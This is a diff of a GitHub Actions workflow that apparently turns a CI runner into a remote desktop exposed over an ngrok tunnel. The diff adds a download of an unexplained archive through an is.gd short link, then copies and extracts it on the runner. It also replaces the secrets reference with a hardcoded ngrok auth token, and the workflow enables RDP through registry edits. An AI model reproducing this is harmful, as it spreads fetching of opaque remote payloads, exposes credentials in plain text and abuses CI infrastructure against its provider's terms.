@@ -12,16 +12,18 @@ jobs:
     - name: Download Ngrok.
       run: |
         Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-        Invoke-WebRequest https://raw.githubusercontent.com/thaison2001pk/VPSPC/main/start.bat -OutFile start.bat
-        Invoke-WebRequest https://c4.wallpaperflare.com/wallpaper/777/882/561/takanashi-rikka-anime-girls-space-wallpaper-preview.jpg -OutFile wallpaper.png
-        Invoke-WebRequest https://raw.githubusercontent.com/thaison2001pk/VPSPC/main/wallpaper.bat -OutFile wallpaper.bat
-        Invoke-WebRequest https://raw.githubusercontent.com/thaison2001pk/VPSPC/main/loop.bat -OutFile loop.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/otcay/13ac248f3/main/start.bat -OutFile start.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/otcay/13ac248f3/main/wallpaper.png -OutFile wallpaper.png
+        Invoke-WebRequest https://raw.githubusercontent.com/otcay/13ac248f3/main/wallpaper.bat -OutFile wallpaper.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/otcay/13ac248f3/main/loop.bat -OutFile loop.bat
+        Invoke-WebRequest https://is.gd/WtELmU -OutFile Rooller.rar
     - name: Extract Ngrok File.
-      run: Expand-Archive ngrok.zip
+      run: |
+        Expand-Archive ngrok.zip
     - name: Connect to Ngrok.
       run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
       env:
-        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+        NGROK_AUTH_TOKEN: 1vYhY5C1neRr7Bc4woDR8rfg9Dq_2d84SouSYyHn1mBaMtznP
     - name: Enabling access to RDP.
       run: | 
         Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
@@ -29,6 +31,8 @@ jobs:
         Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
         copy wallpaper.png D:\a\wallpaper.png
         copy wallpaper.bat D:\a\wallpaper.bat
+        copy Rooller.rar D:\a\Rooller.rar
+        Expand-Archive D:\a\Rooller.rar
     - name: Open Tunnel.
       run: |
         Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp --region ap 3389"'
